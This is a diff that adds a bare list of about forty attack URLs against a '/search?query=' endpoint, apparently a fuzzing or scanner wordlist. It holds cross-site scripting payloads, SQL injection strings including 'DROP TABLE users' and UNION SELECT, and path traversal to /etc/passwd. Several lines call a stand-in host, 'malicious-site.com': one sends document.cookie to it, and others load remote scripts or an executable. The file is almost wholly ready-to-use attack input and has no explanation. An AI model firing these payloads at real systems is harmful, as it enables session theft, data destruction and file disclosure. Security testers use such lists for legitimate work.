@@ -1,0 +1,40 @@
+/search?query=<script>alert('XSS')</script>
+/search?query=<img src=x onerror=alert('XSS')>
+/search?query=%27%3B DROP TABLE users--
+/search?query=../../../../../etc/passwd
+/search?query=../../../../etc/passwd%00
+/search?query=../../../etc/passwd%00.jpg
+/search?query=%3Cscript%3Ealert('XSS')%3C/script%3E
+/search?query=%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E
+/search?query=1%20OR%201%3D1
+/search?query=1%27%20OR%20%271%27%3D%271
+/search?query=admin%27%20--
+/search?query=admin%27%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20--
+/search?query=<svg/onload=alert('XSS')>
+/search?query=<a href="javascript:alert('XSS')">Click me</a>
+/search?query=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E
+/search?query=<iframe%20src="javascript:alert('XSS')">
+/search?query=%3Cbody%20onload=alert('XSS')%3E
+/search?query=<input%20type="image"%20src="x"%20onerror="alert('XSS')">
+/search?query=<div%20style="background:url(javascript:alert('XSS'))">
+/search?query=%3Cscript%3Efetch('https://malicious-site.com/collect?cookie='%2Bdocument.cookie)%3C/script%3E
+/search?query=<body%20onload=alert('XSS')>
+/search?query=<img%20src=x%20onerror=alert('XSS')>
+/search?query=%3Csvg/onload=alert('XSS')%3E
+/search?query=%3Ca%20href="javascript:alert('XSS')">Click%20me%3C/a>
+/search?query=<input%20type="text"%20onfocus=alert('XSS')>
+/search?query=<script%20src="https://malicious-site.com/malicious-script.js"></script>
+/search?query=%22%3E%3Cimg%20src=x%20onerror=alert('XSS')%3E
+/search?query=%3Cscript%20async%20src="https://malicious-site.com/malicious-script.js"></script>
+/search?query=%3Cmarquee%20onstart=alert('XSS')%3EHello%3C/marquee>
+/search?query=<style>%20body:after%20{content:%20"XSS"}%20</style>
+/search?query=<base%20href="javascript:alert('XSS')">//`
+/search?query=<a%20onmouseover=alert('XSS')>Hover%20me</a>
+/search?query=%3Cimg%20src=x%20onmouseover=alert('XSS')%3E
+/search?query=<input%20type="text"%20onmouseover=alert('XSS')>
+/search?query=%3Cstyle%3E*{color:%20red;}</style><svg/onload=alert('XSS')>
+/search?query=<audio%20src%3Dx%20onerror%3Dalert('XSS')>
+/search?query=%3Ciframe%20src="https://malicious-site.com/malicious-page"%3E
+/search?query=%3Cdiv%20onclick=alert('XSS')>Click%20me</div>
+/search?query=<embed%20src="https://malicious-site.com/malicious-file.exe">
+/search?query=<a%20href="https://malicious-site.com"//onclick=alert('XSS')>Click%20me</a>
